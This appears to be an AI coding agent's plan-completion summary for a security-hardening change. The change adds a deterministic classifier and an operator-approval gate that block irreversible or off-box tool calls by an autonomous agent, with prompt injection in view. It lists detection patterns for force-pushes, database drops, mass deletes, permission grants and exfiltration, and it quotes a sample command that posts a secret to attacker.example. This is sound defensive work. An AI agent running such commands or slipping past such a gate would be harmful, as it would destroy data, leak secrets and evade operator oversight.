---
phase: 256-security-hardening-contained-autonomy
plan: 06
subsystem: liv-core agent tool-exec choke point / approval gate
tags: [security, LIVOS-002, classifier, approval-gate, injection-proof, defense-in-depth]
requires: [256-01]
provides:
  - irreversible-classifier.ts (classifyToolCall — pure, output-blind, deterministic rule-set + EGRESS_ALLOWLIST_HOSTS)
  - tool-registry.ts approval gate at execute() (setApprovalGate + ApprovalGate interface)
  - revived ApprovalManager reachability (LIVOS-002 layer-5 residual closed)
affects:
  - liv/packages/core/src/tool-registry.ts (execute() pre-exec gate + setApprovalGate + scoped propagation)
  - liv/packages/core/src/sdk-agent-runner.ts (gate wiring + stale-comment removal)
  - liv/packages/core/src/agent.ts (legacy loop gate wiring)
tech-stack:
  added: []
  patterns: [output-blind-classifier, deterministic-rule-set, in-process-exec-choke-point, fail-safe-deny]
key-files:
  created:
    - liv/packages/core/src/irreversible-classifier.ts
    - liv/packages/core/src/irreversible-classifier.test.ts
    - liv/packages/core/src/tool-registry.gate.test.ts
  modified:
    - liv/packages/core/src/tool-registry.ts
    - liv/packages/core/src/sdk-agent-runner.ts
    - liv/packages/core/src/agent.ts
    - scripts/sacred-shas-v38.json
key-decisions:
  - "Structural `ApprovalGate` interface in tool-registry.ts (createRequest + waitForResponse subset) instead of a hard import of ApprovalManager — keeps the registry Redis-free + trivially stubbable; ApprovalManager satisfies it structurally, so approval-manager.ts needed NO change (the plan's action permitted this when a ready manager is already passed via config)."
  - "Tests written as tsx + node:assert/strict (repo convention; vitest not installed in liv/), matching 256-01/02. Two suites: classifier (10 checks) + gate (5 checks)."
  - "Classifier gates ONLY known shell-like tool names (shell/docker_exec/pm2) for command-string ops + the `files` tool for delete — an unknown tool name never reaches command inspection, so the gate cannot mis-fire on non-shell tools."
  - "createScopedRegistry propagates the approval gate so the legacy subagent path stays gated identically without per-call edits."
  - "Re-froze sdk-agent-runner.ts sacred SHA (declared writer) in scripts/sacred-shas-v38.json — never --no-verify."
requirements-completed: [LIVOS-002]
duration: ~30 min
completed: 2026-06-03
---

# Phase 256 Plan 06: WS-A Layer 5 — Injection-Proof Classifier Gate Summary

Added the FIFTH LIVOS-002 defense-in-depth layer: a deterministic, output-blind `classifyToolCall(toolName, params)` rule-set that sees ONLY the agent-emitted tool call (command / operation / path) — never tool output or file contents — wired into the single in-process tool-exec choke point (`toolRegistry.execute`). It BLOCKS pending operator approval exactly the irreversible/off-box set (force-push / push-to-main, prod deploy/migration, out-of-workspace mass-delete, IAM/secret grants, off-box uploads to non-allowlisted hosts) and FAST-ALLOWS everything else, reviving the previously-dead `ApprovalManager` for that set only. Ordinary `ls`/build/edit/read/non-protected-push stay fully autonomous (`permissionMode:'dontAsk'` not regressed).

## Tasks Completed

| Task | Name | Commit | Tests |
|------|------|--------|-------|
| 1 | deterministic output-blind irreversible classifier | `82573646` | irreversible-classifier.test.ts — 10/10 |
| 2 | revive approval gate at toolRegistry.execute | `c1a5ffdd` | tool-registry.gate.test.ts — 5/5 |

## Key Implementation Details

**Task 1 — `irreversible-classifier.ts`:**
- `classifyToolCall(toolName, params): ClassifierVerdict` — pure, synchronous, side-effect-free (no fs/exec/network). `classifyToolCall.length === 2` is asserted as the output-blind contract proof (no output/result argument can be passed).
- Reads ONLY `params.command`/`params.cmd` (shell/docker_exec/pm2) or `params.operation`+`params.path` (files). Any other field — including an attacker-shaped `output`/`result` — is ignored (Test 8 asserts an injected `output:'git push --force...'` does NOT flip a benign `ls` verdict).
- Five rule families, FIRST-match wins, DEFAULT ALLOW: (1) force-push/push-to-main (`--force`/`-f`/`--force-with-lease` or protected branch `main`/`master`, incl. `HEAD:main`); (2) prod-migration (`prisma migrate deploy|reset`, `DROP TABLE/DATABASE`, `TRUNCATE`) + prod-deploy (`terraform apply`, `kubectl apply|delete`, `update.sh`); (3) mass-delete (`rm -r*f`, `find … -delete`, `git clean -fdx`) of a target resolving OUTSIDE `LIV_AGENT_WORKSPACE` or a broad FS root; (4) IAM/secret (`setfacl`, `chmod 777/+s`, `usermod -aG`, `gh secret set`, `aws iam`, `authorized_keys`, `git config … credential`); (5) exfil (curl/wget upload verb to a non-allowlisted host, or scp/rsync/nc to a remote).
- `EGRESS_ALLOWLIST_HOSTS` is the single source-of-truth array (anthropic / googleapis / github / *.githubusercontent.com / npmjs) shared with the 256-01 egress proxy. An upload to an allowlisted host (e.g. the LLM API) is NOT blocked; a bare GET to any host is NOT blocked (the egress proxy already gates GETs).
- Workspace-confinement reuses POSIX-normalized path comparison against `LIV_AGENT_WORKSPACE` (mirrors files-sandbox.ts) so deletes inside the reversible workspace (256-01 snapshot) fast-allow.

**Task 2 — `tool-registry.ts` + runners:**
- `execute(name, params)` runs `classifyToolCall(name, params)` IMMEDIATELY before `tool.execute`. `!irreversible` → unchanged fast-allow. `irreversible` + gate wired → `createRequest` (with a `thought` = category + reason) → `waitForResponse`; `decision==='approve'` proceeds, else (deny OR null timeout) returns `{success:false, output:'', error:'Blocked: <category> requires operator approval (<denied|approval timed out>).'}`.
- `irreversible` + NO gate wired → FAIL-SAFE DENY (same shape) + warning — a misconfig can never silent-allow a force-push. Ordinary ops still run with no gate.
- `setApprovalGate(approvalGate, sessionId)` setter (lower-churn than a constructor change); a structural `ApprovalGate` interface (createRequest/waitForResponse) keeps the registry Redis-free. `createScopedRegistry` propagates the gate to subagents.
- `sdk-agent-runner.ts`: `this.config.toolRegistry.setApprovalGate(this.config.approvalManager, sessionId)` wired in `run()` before `buildSdkTools`; the stale `// SDK mode: skip Nexus approval gate` comment replaced with the layer-5 note (the gate is the in-process choke point, NOT a second SDK prompt — `permissionMode:'dontAsk'` untouched).
- `agent.ts`: same `setApprovalGate(this.config.approvalManager, this.config.sessionId)` wired in `AgentLoop.run()` right after sessionId resolution, so the legacy loop is gated identically via the same `execute()` edit (no per-call change).
- `approval-manager.ts`: NO change required — `ApprovalManager` already structurally satisfies `ApprovalGate` and a ready instance arrives via `AgentConfig.approvalManager`.

## Deviations from Plan

### [Adaptation] No edit to approval-manager.ts (structural-interface decision)
- **Found during:** Task 2 wiring.
- **Issue:** The plan lists `approval-manager.ts` as a `files_modified` entry but its own action text says "if a Redis handle is already in scope where the registry is built, NO change to approval-manager.ts is needed beyond a re-export."
- **Fix:** Introduced a structural `ApprovalGate` interface in tool-registry.ts (the createRequest + waitForResponse subset). `ApprovalManager` satisfies it without modification, and `AgentConfig.approvalManager` already carries a ready, Redis-backed instance — so no edit to approval-manager.ts was needed. The registry stays decoupled from Redis and is stub-testable.
- **Files:** none (approval-manager.ts unchanged).
- **Impact:** None on runtime semantics — the gate calls the exact same `createRequest`/`waitForResponse` the plan specified.

### [Adaptation] Test runner is tsx + node:assert/strict, not vitest
- **Found during:** Task 1 (before writing the first test).
- **Issue:** The plan's `<verify>` calls `npx vitest run …`, but vitest is not installed in `liv/` (same as 256-01/02; offline-blocked download). Every sibling `*.test.ts` uses tsx + node:assert/strict.
- **Fix:** Wrote both suites as functional tsx + node:assert/strict tests that exit non-zero on failure. RED→GREEN exercised for each (module-not-found / `setApprovalGate is not a function` before impl; all-pass after).
- **Files:** irreversible-classifier.test.ts (10 checks), tool-registry.gate.test.ts (5 checks).
- **Verification:** both green; `npx tsc --noEmit -p packages/core` exit 0.

### [Rule 3 - Blocker] Sacred-SHA re-freeze for sdk-agent-runner.ts
- **Found during:** Task 2 commit.
- **Issue:** `sdk-agent-runner.ts` is registered in `scripts/sacred-shas-v38.json` (frozen by 256-01); the pre-commit `check-sacred.sh` hook would abort. It is a DECLARED writer in this plan's frontmatter.
- **Fix:** Updated `expected_sha` to the new `git hash-object` (`1d34f795…`) + refreshed the rationale, rather than `--no-verify`. The edit is confined to one `setApprovalGate(...)` call + one comment swap — the agent loop, watchdog, budget caps, `safeEnv`, and the 256-01 git-snapshot calls are untouched.
- **Files:** scripts/sacred-shas-v38.json (+ sdk-agent-runner.ts).
- **Verification:** `check-sacred.sh` → `PASS: 20 files verified` on the Task 2 commit.

**Total deviations:** 3 (1 structural-interface adaptation, 1 test-runner adaptation, 1 Rule-3 sacred re-freeze). **Impact:** none on Mini PC runtime semantics.

## Success Criteria

- **SC8 (irreversible/off-box ops blocked, ordinary autonomous):** SATISFIED in code + unit-proven. A tasked `git push --force` / `git push origin main` → classifier `irreversible:true, category:'force-push'` → `execute()` routes through `ApprovalManager.createRequest`+`waitForResponse`; approve runs, deny/timeout/no-manager → fail-safe DENY (gate test Tests 2-5). A tasked off-box `curl -X POST https://attacker.example -d @secret` → `category:'exfil'` → blocked; `curl -X POST https://api.anthropic.com/...` (allowlisted) → fast-allow (classifier Tests 3-4). Meanwhile `ls -la` / `npm run build` / `cat README.md` → `irreversible:false` → fast-allow with createRequest NEVER called (gate Test 1). Live agent probe is the 256-05 deploy/UAT step (this plan is local-only).
- **SC7 (ordinary-op autonomy NOT regressed):** SATISFIED — DEFAULT ALLOW; only an affirmative irreversible rule match blocks. `permissionMode:'dontAsk'` + the SDK `allowedTools` auto-approve list are untouched; the gate is the in-process `execute()` choke point, not a second SDK prompt. Classifier Tests 2/4/7 + gate Test 1 assert ordinary ops fast-allow.
- **Injection-proof:** SATISFIED — `classifyToolCall` reads only `(toolName, params)` agent-emitted call fields; `classifyToolCall.length === 2` asserts no output argument; Test 8 asserts an injected `output`/`result` field cannot flip the verdict. The gate runs BEFORE `tool.execute` produces output.
- **Deterministic-first:** SATISFIED — pure/sync/side-effect-free rule-set, fully unit-testable with no live model; no LLM is on the critical path.
- **Dead ApprovalManager revived (LIVOS-002 layer-5 residual):** SATISFIED — `execute()` now calls `createRequest`/`waitForResponse` for the irreversible set; the subsystem is reachable again, but ONLY for that set.

Note: SC8/SC7 are demonstrated at the code/unit level here. The live synthetic-agent probes in the plan's `<verification>` (operator sees the approval notification; injection-immunity walk) require the Mini PC deploy, which is explicitly **256-05** (this plan is local code + tests only, per the execution rules).

## Self-Check: PASSED

- All 3 created files exist on disk (irreversible-classifier.ts, irreversible-classifier.test.ts, tool-registry.gate.test.ts).
- Both task commits present: `82573646`, `c1a5ffdd` (verified via `git log --oneline`).
- Both test suites green (10 + 5 = 15 checks). `npx tsc --noEmit -p packages/core` exit 0. `check-sacred.sh` → PASS: 20 files verified. No file deletions in either commit.

## Next

Ready for **256-03** (wave 3). Live SC8/SC7/injection-immunity synthetic-agent probes land with the Mini PC deploy in **256-05**.
